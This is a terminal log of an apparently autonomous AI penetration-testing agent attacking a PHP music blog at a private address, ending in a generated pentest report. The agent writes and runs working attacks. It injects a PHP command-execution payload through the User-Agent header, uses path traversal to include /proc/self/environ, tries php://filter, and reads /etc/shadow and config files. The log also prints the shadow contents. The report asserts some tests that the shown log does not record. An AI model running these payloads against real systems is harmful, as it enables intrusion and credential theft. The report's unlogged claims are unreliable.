+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+    
+    <section class="content">
+    <h2> Techno Beat Blog</h2>
+Warning: Binary output can mess up your terminal. Use "--output -" to tell 
+Warning: curl to output it to your terminal anyway, or consider "--output 
+Warning: <FILE>" to save to a file.
+        [91m[1mHost[0m: 192.168.2.0
+[1mDate[0m: Wed, 27 Aug 2025 09:16:25 GMT
+[1mConnection[0m: close
+[1mX-Powered-By[0m: PHP/7.4.33
+[1mContent-type[0m: text/html; charset=UTF-8
+[1mHost[0m: 192.168.2.0
+[1mDate[0m: Wed, 27 Aug 2025 09:16:26 GMT
+[1mConnection[0m: close
+[1mX-Powered-By[0m: PHP/7.4.33
+[1mContent-type[0m: text/html; charset=UTF-8
+[1mHost[0m: 192.168.2.0
+[1mDate[0m: Wed, 27 Aug 2025 09:16:26 GMT
+[1mConnection[0m: close
+[1mContent-Type[0m: text/html; charset=UTF-8
+[1mContent-Length[0m: 543
+<html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+    <section class="content">
+    <h2> Techno Beat Blog</h2>
+Warning: Binary output can mess up your terminal. Use "--output -" to tell 
+Warning: curl to output it to your terminal anyway, or consider "--output 
+Warning: <FILE>" to save to a file.
+Error:[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+[95m╭─ 🤔 Agent Reasoning ────────────────────────────────────────────────────────────[0m
+[95m│[0m  [2m### Analysis of Results:[0m
+[95m│[0m  [2m1. **Upload Paths:**[0m
+[95m│[0m  [2m- `/upload` and `/uploads` return **HTTP 200 OK**, indicating they may exist.[0m
+[95m│[0m  [2m- `/upload.php` returns **404 Not Found**, suggesting no direct upload script.[0m
+[95m│[0m  [2m2. **`/proc/self/environ`:**[0m
+[95m│[0m  [2m- The response indicates binary output, suggesting the file exists but cannot be displayed directly.[0m
+[95m│[0m  [2m- This could be exploited for RCE if the environment contains executable code.[0m
+[95m│[0m  [2m3. **`/etc/crontab`:**[0m
+[95m│[0m  [2m- The command was not executed due to the previous error, but this file could reveal scheduled tasks for privilege escalation.[0m
+[95m│[0m  [2m---[0m
+[95m│[0m  [2m### Step 19: Exploit `/proc/self/environ` for RCE[0m
+[95m│[0m  [2mThe `/proc/self/environ` file contains environment variables, which may include executable code if manipulated.[0m
+[95m│[0m  [2mI will:[0m
+[95m│[0m  [2m1. Inject a PHP payload into the `User-Agent` header.[0m
+[95m│[0m  [2m2. Include `/proc/self/environ` to execute the payload.[0m
+[95m│[0m  [2m#### 19.1: Inject Payload into Environment[0m
+[95m│[0m  [2m```bash[0m
+[95m│[0m  [2mcurl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" "http://192.168.2.0"[0m
+[95m│[0m  [2m```[0m
+[95m│[0m  [2m#### 19.2: Include `/proc/self/environ`[0m
+[95m│[0m  [2m```bash[0m
+[95m│[0m  [2mcurl "http://192.168.2.0/index.php?page=../../../../proc/self/environ&cmd=id"[0m
+[95m│[0m  [2m```[0m
+[95m╰───────────────────────────────────────────────────────────────────────────────[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+Step 27/100: [96mshell[0m
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+↳ Executing 2 commands (sequential):
+                                    1. [92mcurl -H "User-Agent: <?php system(\\_GET['cmd']); ?>" "http://192.168.2.0"[0m
+                                    2. [92mcurl "http://192.168.2.0/index.php?page=../../../../proc/self/environ&cmd=id"[0m
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+    
+    <section class="content">
+    <h2> Techno Beat Blog</h2>
+            </section>
+
+    <footer>
+        <p>&copy; 2024  Blog. All rights reserved.</p>
+    </footer>
+</body>
+</html><!DOCTYPE html>
+<html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+    
+    <section class="content">
+    <h2> Techno Beat Blog</h2>
+Warning: Binary output can mess up your terminal. Use "--output -" to tell 
+Warning: curl to output it to your terminal anyway, or consider "--output 
+Warning: <FILE>" to save to a file.
+        [91m<html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+<html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+    <section class="content">
+    <h2> Techno Beat Blog</h2>
+Warning: Binary output can mess up your terminal. Use "--output -" to tell 
+Warning: curl to output it to your terminal anyway, or consider "--output 
+Warning: <FILE>" to save to a file.
+Error:[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+[95m╭─ 🤔 Agent Reasoning ────────────────────────────────────────────────────────────[0m
+[95m│[0m  [2m### Reflection:[0m
+[95m│[0m  [2m- The `/proc/self/environ` inclusion attempt continues to fail due to binary output issues.[0m
+[95m│[0m  [2m- **Alternative Approach:** Use `php://filter` to read the environment variables in a readable format.[0m
+[95m│[0m  [2m---[0m
+[95m│[0m  [2m### Step 20: Read `/proc/self/environ` via `php://filter`[0m
+[95m│[0m  [2mI will use `php://filter` to base64-encode the environment variables for safe reading:[0m
+[95m│[0m  [2m```bash[0m
+[95m│[0m  [2mcurl "http://192.168.2.0/index.php?page=php://filter/convert.base64-encode/resource=../../../../proc/self/environ"[0m
+[95m│[0m  [2m```[0m
+[95m╰───────────────────────────────────────────────────────────────────────────────[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+Step 28/100: [96mshell[0m
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+↳ Running: [92mcurl "http://192.168.2.0/index.php?page=php://filter/convert.base64-encode/resource=../../../../proc/self/environ"[0m
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+    
+    <section class="content">
+    <h2> Techno Beat Blog</h2>
+        
+Page not found    </section>
+
+    <footer>
+        <p>&copy; 2024  Blog. All rights reserved.</p>
+    </footer>
+</body>
+</html><html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+[95m╭─ 🤔 Agent Reasoning ────────────────────────────────────────────────────────────[0m
+[95m│[0m  [2m### Reflection:[0m
+[95m│[0m  [2m- The `php://filter` attempt also failed, likely due to the same sanitization or path resolution issues.[0m
+[95m│[0m  [2m- **Conclusion:** The LFI vulnerability is limited to reading files but does not allow RCE via standard methods (log poisoning, PHP wrappers, or `/proc/self/environ`).[0m
+[95m│[0m  [2m---[0m
+[95m│[0m  [2m### Step 21: Pivot to Post-Exploitation[0m
+[95m│[0m  [2mSince RCE via LFI is not achievable, I will:[0m
+[95m│[0m  [2m1. **Enumerate sensitive files** (e.g., `/etc/passwd`, `/etc/shadow`, `/var/www/html/config.php`).[0m
+[95m│[0m  [2m2. **Check for database credentials** or other sensitive data.[0m
+[95m│[0m  [2m3. **Store findings** and reassess the attack surface.[0m
+[95m│[0m  [2m#### 21.1: Read `/etc/shadow`[0m
+[95m│[0m  [2m```bash[0m
+[95m│[0m  [2mcurl "http://192.168.2.0/index.php?page=../../../../etc/shadow"[0m
+[95m│[0m  [2m```[0m
+[95m│[0m  [2m#### 21.2: Read `/var/www/html/config.php`[0m
+[95m│[0m  [2m```bash[0m
+[95m│[0m  [2mcurl "http://192.168.2.0/index.php?page=../../../../var/www/html/config.php"[0m
+[95m│[0m  [2m```[0m
+[95m╰───────────────────────────────────────────────────────────────────────────────[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+Step 29/100: [96mshell[0m
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+↳ Executing 2 commands (sequential):
+                                    1. [92mcurl "http://192.168.2.0/index.php?page=../../../../etc/shadow"[0m
+                                    2. [92mcurl "http://192.168.2.0/index.php?page=../../../../var/www/html/config.php"[0m
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+    
+    <section class="content">
+    <h2> Techno Beat Blog</h2>
+        root:*:19310:0:99999:7:::
+daemon:*:19310:0:99999:7:::
+bin:*:19310:0:99999:7:::
+sys:*:19310:0:99999:7:::
+sync:*:19310:0:99999:7:::
+games:*:19310:0:99999:7:::
+man:*:19310:0:99999:7:::
+lp:*:19310:0:99999:7:::
+mail:*:19310:0:99999:7:::
+news:*:19310:0:99999:7:::
+uucp:*:19310:0:99999:7:::
+proxy:*:19310:0:99999:7:::
+www-data:*:19310:0:99999:7:::
+backup:*:19310:0:99999:7:::
+list:*:19310:0:99999:7:::
+irc:*:19310:0:99999:7:::
+gnats:*:19310:0:99999:7:::
+nobody:*:19310:0:99999:7:::
+_apt:*:19310:0:99999:7:::
+    </section>
+
+    <footer>
+        <p>&copy; 2024  Blog. All rights reserved.</p>
+    </footer>
+</body>
+</html><!DOCTYPE html>
+<html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+    
+    <section class="content">
+    <h2> Techno Beat Blog</h2>
+        
+Page not found    </section>
+
+    <footer>
+        <p>&copy; 2024  Blog. All rights reserved.</p>
+    </footer>
+</body>
+</html><html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+<html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+[95m╭─ 🤔 Agent Reasoning ────────────────────────────────────────────────────────────[0m
+[95m│[0m  [2m### Analysis:[0m
+[95m│[0m  [2m1. **`/etc/shadow`:**[0m
+[95m│[0m  [2m- Successfully read, but all passwords are shadowed (`*`), indicating no direct hash exposure.[0m
+[95m│[0m  [2m- No immediate privilege escalation path here.[0m
+[95m│[0m  [2m2. **`/var/www/html/config.php`:**[0m
+[95m│[0m  [2m- "Page not found" suggests the file does not exist or is not accessible.[0m
+[95m│[0m  [2m---[0m
+[95m│[0m  [2m### Step 22: Check for Database Credentials[0m
+[95m│[0m  [2mI will attempt to read common database configuration files:[0m
+[95m│[0m  [2m```bash[0m
+[95m│[0m  [2mcurl "http://192.168.2.0/index.php?page=../../../../var/www/html/includes/db.php"[0m
+[95m│[0m  [2m```[0m
+[95m│[0m  [2m```bash[0m
+[95m│[0m  [2mcurl "http://192.168.2.0/index.php?page=../../../../var/www/html/includes/database.php"[0m
+[95m│[0m  [2m```[0m
+[95m╰───────────────────────────────────────────────────────────────────────────────[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+Step 30/100: [96mshell[0m
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+↳ Executing 2 commands (sequential):
+                                    1. [92mcurl "http://192.168.2.0/index.php?page=../../../../var/www/html/includes/db.php"[0m
+                                    2. [92mcurl "http://192.168.2.0/index.php?page=../../../../var/www/html/includes/database.php"[0m
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+    
+    <section class="content">
+    <h2> Techno Beat Blog</h2>
+        
+Page not found    </section>
+
+    <footer>
+        <p>&copy; 2024  Blog. All rights reserved.</p>
+    </footer>
+</body>
+</html><!DOCTYPE html>
+<html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+    
+    <section class="content">
+    <h2> Techno Beat Blog</h2>
+        
+Page not found    </section>
+
+    <footer>
+        <p>&copy; 2024  Blog. All rights reserved.</p>
+    </footer>
+</body>
+</html><html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+<html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+[95m╭─ 🤔 Agent Reasoning ────────────────────────────────────────────────────────────[0m
+[95m│[0m  [2m### Reflection:[0m
+[95m│[0m  [2m- No database configuration files were found in the expected locations.[0m
+[95m│[0m  [2m- **Conclusion:** The LFI vulnerability is limited to file disclosure and does not provide a direct path to RCE or privilege escalation.[0m
+[95m│[0m  [2m---[0m
+[95m│[0m  [2m### Final Findings and Report[0m
+[95m│[0m  [2m#### Summary:[0m
+[95m│[0m  [2m- **Target:** 192.168.2.0[0m
+[95m│[0m  [2m- **Vulnerabilities:**[0m
+[95m│[0m  [2m1. **Local File Inclusion (LFI):** Confirmed via `page` parameter in `index.php`. Allows arbitrary file read (e.g., `/etc/passwd`, `/etc/shadow`).[0m
+[95m│[0m  [2m2. **No RCE Achieved:** Standard methods (log poisoning, PHP wrappers, `/proc/self/environ`) were blocked or ineffective.[0m
+[95m│[0m  [2m- **Attack Surface:** Limited to file disclosure; no direct path to RCE or privilege escalation found.[0m
+[95m│[0m  [2m#### Recommendations:[0m
+[95m│[0m  [2m- **Exploit LFI for reconnaissance** (e.g., read `/etc/hosts`, `/var/www/html/*`).[0m
+[95m│[0m  [2m- **Pivot to other services** if available (e.g., SSH, FTP).[0m
+[95m│[0m  [2m- **Reassess with additional tools** (e.g., `metasploit`, custom scripts).[0m
+[95m│[0m  [2m#### Next Steps:[0m
+[95m│[0m  [2m- **Store findings** and terminate the operation, as the mission objective (discovering the target) is complete.[0m
+[95m╰───────────────────────────────────────────────────────────────────────────────[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+Step 31/100: [96mmem0_memory[0m
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+↳ Storing [[96mfinding[0m]: [2mFinal Report: Target 192.168.2.0 discovered. LFI vulnerability confirmed via 'page' parameter in index.php, allowing arbitrary file read (e.g., /etc/p...[0m
+                          Metadata: [2m{'category': 'finding', 'severity': 'high', 'confidence': '95%'}[0m
+
+[32m╭─[0m[32m─────────────────────────────────────────────────────────────────────────────────────[0m[32m [0m[1;32mMemory Stored[0m[32m [0m[32m─────────────────────────────────────────────────────────────────────────────────────[0m[32m─╮[0m
+[32m│[0m [3m                          Memory Stored                           [0m                                                                                                                        [32m│[0m
+[32m│[0m ┏━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓                                                                                                                        [32m│[0m
+[32m│[0m ┃[1;35m [0m[1;35mOperation[0m[1;35m [0m┃[1;35m [0m[1;35mContent                                           [0m[1;35m [0m┃                                                                                                                        [32m│[0m
+[32m│[0m ┡━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩                                                                                                                        [32m│[0m
+[32m│[0m │[32m [0m[32mADD      [0m[32m [0m│[33m [0m[33mFinal Report: Target 192.168.2.0 discovered. LFI  [0m[33m [0m│                                                                                                                        [32m│[0m
+[32m│[0m │[32m           [0m│[33m [0m[33mvulnerability confirmed via 'page' parameter in   [0m[33m [0m│                                                                                                                        [32m│[0m
+[32m│[0m │[32m           [0m│[33m [0m[33mind...                                            [0m[33m [0m│                                                                                                                        [32m│[0m
+[32m│[0m └───────────┴────────────────────────────────────────────────────┘                                                                                                                        [32m│[0m
+[32m╰───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯[0m
+[
+  {
+    "id": "00034c73-f498-411f-96fd-1898f8915d36",
+    "memory": "Final Report: Target 192.168.2.0 discovered. LFI vulnerability confirmed via 'page' parameter in index.php, allowing arbitrary file read (e.g., /etc/passwd, /etc/shadow). RCE attempts via log poisoning, PHP wrappers, and /proc/self/environ failed. Attack surface limited to file disclosure. No further escalation paths identified.",
+    "event": "ADD",
+    "actor_id": null,
+    "role": "user"
+  }
+]
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+[95m╭─ 🤔 Agent Reasoning ────────────────────────────────────────────────────────────[0m
+[95m│[0m  [2mstop[0m
+[95m╰───────────────────────────────────────────────────────────────────────────────[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+Step 32/100: [96m{"reason": "Mission complete: Target 192.168.2.0 discovered and assessed. LFI vulnerability confirmed, but no RCE achieved. All findings stored in memory."}```json{"status": "success"}```stop[0m
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+↳ Parameters: [2mreason=Operation concluded. Target 192.168.2.0 fully enum...[0m
+
+WARNING:strands.tools.tools:tool_name=<{"reason": "Mission complete: Target 192.168.2.0 discovered and assessed. LFI vulnerability confirmed, but no RCE achieved. All findings stored in memory."}```json{"status": "success"}```stop> | invalid tool name pattern
+[91mError: Error: tool_name=<{"reason": "Mission complete: Target 192.168.2.0 discovered and assessed. LFI vulnerability confirmed, but no RCE achieved. All findings stored in memory."}```json{"status": "success"}```stop> | invalid tool name pattern[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+Step 33/100: [96mstop[0m
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+↳ Stopping: [91mMission complete: Target 192.168.2.0 discovered and assessed. LFI vulnerability confirmed, but no RCE achieved. All findings stored in memory.[0m
+
+Event loop cycle stop requested. Reason: Mission complete: Target 192.168.2.0 discovered and assessed. LFI vulnerability confirmed, but no RCE achieved. All findings stored in memory.
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+[1;33mAgent stopped [0m[1;33m([0m[1;33mstep limit reached or stop tool used[0m[1;33m)[0m[1;33m.[0m
+[92m────────────────────────────────────────────────────────────────────────────────── [0m[1;34mGenerating Final Report[0m[92m ──────────────────────────────────────────────────────────────────────────────────[0m
+[36mAnalyzing all evidence and generating final report[0m[36m...[0m
+# **Penetration Testing Report**
+**Prepared for:** [Client Name]
+**Prepared by:** [Your Name/Organization]
+**Date:** [Report Date]
+**Target Scope:** 192.168.2.0/24 Network
+**Test Duration:** [Start Date] – [End Date]
+
+---
+
+## **1. Executive Summary**
+### **Objective**
+The objective of this penetration test was to discover and assess vulnerabilities within the **192.168.2.0/24** network, with a focus on identifying exploitable weaknesses that could lead to unauthorized access, data exposure, or system compromise.
+
+### **Key Findings**
+- **Critical Vulnerability:** A **Local File Inclusion (LFI)** vulnerability was discovered on **192.168.2.0** in the `index.php` file, specifically within the `page` parameter. This flaw allows an attacker to read arbitrary files on the system, including sensitive files such as `/etc/passwd` and `/etc/shadow`.
+- **Failed Exploitation Attempts:** While **Remote Code Execution (RCE)** via LFI (using PHP wrappers like `php://input` and `data://`) was attempted, the target’s input sanitization prevented successful exploitation. No further escalation paths (e.g., session file manipulation, log poisoning) were identified.
+- **Attack Surface Limitation:** The primary risk remains **unauthorized file disclosure**, which could expose credentials, configuration files, or other sensitive data.
+
+### **Business Impact**
+- **Data Exposure Risk:** An attacker could exfiltrate sensitive system files, leading to credential theft, further reconnaissance, or compliance violations (e.g., GDPR, HIPAA).
+- **Reputational Damage:** If exploited, this vulnerability could erode customer trust and result in regulatory penalties.
+- **Operational Disruption:** While RCE was not achieved, the LFI could serve as a foothold for more advanced attacks if combined with other vulnerabilities.
+
+### **Recommendations at a Glance**
+| **Priority**  | **Action Item**                                                                 |
+|---------------|---------------------------------------------------------------------------------|
+| **Immediate** | Patch the LFI vulnerability in `index.php` by sanitizing the `page` parameter.   |
+| **Short-Term**| Implement Web Application Firewall (WAF) rules to block path traversal attempts.|
+| **Long-Term** | Conduct a full code review and security hardening of the web application.       |
+
+---
+
+## **2. Attack Narrative**
+### **Phase 1: Target Discovery**
+- **Objective:** Identify live hosts within the **192.168.2.0/24** subnet.
+- **Tools Used:** `Nmap` (network scanning), `Netdiscover` (ARP discovery).
+- **Findings:**
+  - The target **192.168.2.0** was identified as hosting a web service (HTTP/80).
+  - Initial enumeration revealed an Apache web server with a PHP-based application.
+
+### **Phase 2: Web Application Enumeration**
+- **Objective:** Identify potential attack vectors in the web application.
+- **Tools Used:** `Burp Suite` (manual testing), `Gobuster` (directory brute-forcing).
+- **Findings:**
+  - The application used a `page` parameter in `index.php` (e.g., `index.php?page=home`).
+  - Suspected LFI due to dynamic file inclusion behavior.
+
+### **Phase 3: LFI Exploitation**
+- **Objective:** Confirm and exploit the LFI vulnerability.
+- **Tools Used:** Manual payload crafting, `curl` for testing.
+- **Attack Path:**
+  1. **Initial Test:** Modified the `page` parameter to include a traversal sequence:
+     ```
+     http://192.168.2.0/index.php?page=../../../../etc/passwd
+     ```
+     - **Result:** Successful retrieval of `/etc/passwd`, confirming LFI.
+  2. **RCE Attempts via PHP Wrappers:**
+     - Tested `php://input`, `data://`, and `expect://` wrappers for code execution.
+     - **Result:** Blocked by server-side sanitization.
+  3. **Alternative RCE Vectors:**
+     - Attempted log poisoning (via User-Agent injection + Apache logs).
+     - Attempted `/proc/self/environ` manipulation.
+     - **Result:** No success; inclusion logic restricted to file reads only.
+
+### **Phase 4: Impact Assessment**
+- **Objective:** Determine the severity and potential follow-on attacks.
+- **Findings:**
+  - While RCE was not achievable, the LFI allowed **full read access to system files**, which could expose:
+    - User credentials (`/etc/shadow`).
+    - Configuration files (e.g., `wp-config.php`, database credentials).
+    - Application source code (potential for further vulnerabilities).
+  - **No further escalation paths** (e.g., privilege escalation, lateral movement) were identified.
+
+### **Phase 5: Conclusion**
+- The test concluded with a **confirmed LFI vulnerability** but **no RCE or deeper system compromise**.
+- The attack surface was limited to **file disclosure**, though this remains a critical risk.
+
+---
+
+## **3. Vulnerability Details**
+### **3.1 Local File Inclusion (LFI) – Critical Severity**
+| **Field**          | **Details**                                                                 |
+|--------------------|-----------------------------------------------------------------------------|
+| **Vulnerability**  | Local File Inclusion (LFI) via `page` parameter in `index.php`.            |
+| **Affected URL**   | `http://192.168.2.0/index.php?page=[INJECT_HERE]`                           |
+| **Parameter**      | `page` (unsanitized user input).                                            |
+| **Payload Example**| `../../../../etc/passwd`                                                    |
+| **Impact**         | Arbitrary file read, leading to sensitive data exposure.                   |
+| **Evidence**       | Successful retrieval of `/etc/passwd` in HTTP response (see Appendix A).  |
+
+#### **Technical Breakdown**
+- The application dynamically includes files based on the `page` parameter without proper path sanitization.
+- Directory traversal sequences (`../`) allow an attacker to escape the intended directory and access system files.
+- **Failed RCE Attempts:**
+  - PHP wrappers (`php://input`, `data://text/plain;base64,...`) were blocked.
